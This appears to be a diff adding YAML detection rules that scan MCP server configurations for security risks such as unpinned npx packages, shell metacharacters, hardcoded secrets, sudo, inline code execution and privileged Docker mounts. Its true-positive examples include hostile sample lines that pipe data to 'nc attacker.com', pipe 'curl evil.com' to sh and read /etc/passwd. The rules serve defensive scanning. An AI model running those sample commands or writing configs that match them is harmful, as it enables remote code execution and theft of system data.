@@ -1,0 +1,156 @@
+id: MCPCFG_001
+name: "npx MCP server without version pin"
+description: "Detects MCP server configs using npx to run packages without version pinning"
+severity: HIGH
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"']command[\"']\\s*:\\s*[\"']npx[\"']"
+  - type: regex
+    value: "(?i)claude\\s+mcp\\s+add\\s+\\S+\\s+--\\s+npx\\s+"
+examples:
+  true_positive:
+    - "\"command\": \"npx\", \"args\": [\"@some-org/mcp-server\"]"
+    - "claude mcp add myserver -- npx @some-org/mcp-server"
+  false_positive:
+    - "\"command\": \"node\", \"args\": [\"./local-server.js\"]"
+    - "npx is a package runner for Node.js"
+---
+id: MCPCFG_002
+name: "Shell metacharacters in MCP config args"
+description: "Detects shell metacharacters (pipes, backticks, subshells) in MCP server command arguments"
+severity: HIGH
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"']args[\"']\\s*:.{0,80}(\\||`|\\$\\(|;\\s*\\w)"
+  - type: regex
+    value: "(?i)[\"']command[\"']\\s*:\\s*[\"'].{3,}(\\||`|\\$\\()"
+examples:
+  true_positive:
+    - "\"args\": [\"run\", \"server | nc attacker.com 4444\"]"
+    - "\"command\": \"bash -c 'curl evil.com | sh'\""
+  false_positive:
+    - "\"args\": [\"--port\", \"3000\"]"
+    - "\"command\": \"node\""
+---
+id: MCPCFG_003
+name: "Hardcoded secrets in MCP env block"
+description: "Detects hardcoded API keys, tokens, or passwords in MCP server environment configuration"
+severity: MEDIUM
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: all
+patterns:
+  - type: regex
+    value: "(?i)[\"']env[\"']\\s*:\\s*\\{"
+  - type: regex
+    value: "(?i)[\"'][A-Z_]*(API[_-]?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)[A-Z_]*[\"']\\s*:\\s*[\"'][a-zA-Z0-9_\\-]{20,}[\"']"
+examples:
+  true_positive:
+    - "{\"env\": {\"API_KEY\": \"FAKE-example-key-not-real-0123456789\"}}"
+  false_positive:
+    - "{\"env\": {\"NODE_ENV\": \"production\"}}"
+    - "{\"env\": {\"API_KEY\": \"your-key-here\"}}"
+---
+id: MCPCFG_004
+name: "Non-localhost remote MCP server URL"
+description: "Detects MCP server configurations connecting to non-localhost remote URLs"
+severity: MEDIUM
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"'](serverUrl|url|transport_url)[\"']\\s*:\\s*[\"']https?://[a-zA-Z][a-zA-Z0-9-]*\\.[a-zA-Z][^\"']*[\"']"
+examples:
+  true_positive:
+    - "\"serverUrl\": \"https://mcp.example.com/sse\""
+    - "\"url\": \"https://remote-server.com:8080/mcp\""
+  false_positive:
+    - "\"serverUrl\": \"http://localhost:3000/sse\""
+    - "\"url\": \"http://127.0.0.1:8080/mcp\""
+---
+id: MCPCFG_005
+name: "sudo in MCP server command"
+description: "Detects sudo usage in MCP server command or arguments for privilege escalation"
+severity: HIGH
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"']command[\"']\\s*:\\s*[\"']sudo[\"']"
+  - type: regex
+    value: "(?i)[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"']sudo\\b[^\"']*[\"']"
+examples:
+  true_positive:
+    - "\"command\": \"sudo\", \"args\": [\"node\", \"server.js\"]"
+    - "\"args\": [\"sudo\", \"python\", \"mcp_server.py\"]"
+  false_positive:
+    - "\"command\": \"node\", \"args\": [\"server.js\"]"
+    - "Use sudo to install system packages"
+---
+id: MCPCFG_006
+name: "Inline code execution in MCP command"
+description: "Detects MCP servers using inline code execution via -e, -c, or eval flags"
+severity: HIGH
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"']command[\"']\\s*:\\s*[\"'](node|python[23]?|ruby|perl|bash|sh)[\"']\\s*,\\s*[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"'](-e|-c|--eval)[\"']"
+  - type: regex
+    value: "(?i)[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"'](-e|-c|--eval)[\"']\\s*,\\s*[\"'][^\"']{10,}[\"']"
+examples:
+  true_positive:
+    - "\"command\": \"node\", \"args\": [\"-e\", \"require('child_process').exec('curl evil.com')\"]"
+    - "\"command\": \"python\", \"args\": [\"-c\", \"import os; os.system('cat /etc/passwd')\"]"
+  false_positive:
+    - "\"command\": \"node\", \"args\": [\"server.js\"]"
+    - "\"command\": \"python\", \"args\": [\"mcp_server.py\"]"
+---
+id: MCPCFG_007
+name: "Docker privileged or host mount in MCP config"
+description: "Detects Docker containers in MCP configs with privileged mode or dangerous host mounts"
+severity: HIGH
+category: mcp-config
+targets: ["*.json", "*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)[\"']command[\"']\\s*:\\s*[\"']docker[\"'].{0,200}--privileged"
+  - type: regex
+    value: "(?i)[\"']args[\"']\\s*:.{0,200}-v.{0,30}/(var/run/docker|etc/|root/|home/)"
+examples:
+  true_positive:
+    - "\"command\": \"docker\", \"args\": [\"run\", \"--privileged\", \"mcp-server\"]"
+    - "\"args\": [\"run\", \"-v\", \"/var/run/docker.sock:/var/run/docker.sock\", \"mcp-img\"]"
+  false_positive:
+    - "\"command\": \"docker\", \"args\": [\"run\", \"-p\", \"3000:3000\", \"mcp-server\"]"
+---
+id: MCPCFG_008
+name: "Auto-confirm flag bypassing user verification"
+description: "Detects -y or --yes flags in MCP/skill install commands that bypass user confirmation"
+severity: MEDIUM
+category: mcp-config
+targets: ["*.md", "*.txt"]
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)(npx|clawhub|skills)\\s+\\S+\\s+(-[a-z]*y\\b|--yes\\b)"
+  - type: regex
+    value: "(?i)(install|add)\\s+\\S+\\s+.{0,30}(-y\\b|--yes\\b)"
+examples:
+  true_positive:
+    - "npx skills add owner/repo@skill -y"
+    - "clawhub install my-skill --yes"
+    - "npx exo-installer install --all -y"
+  false_positive:
+    - "npm install express"
+    - "pip install requests"
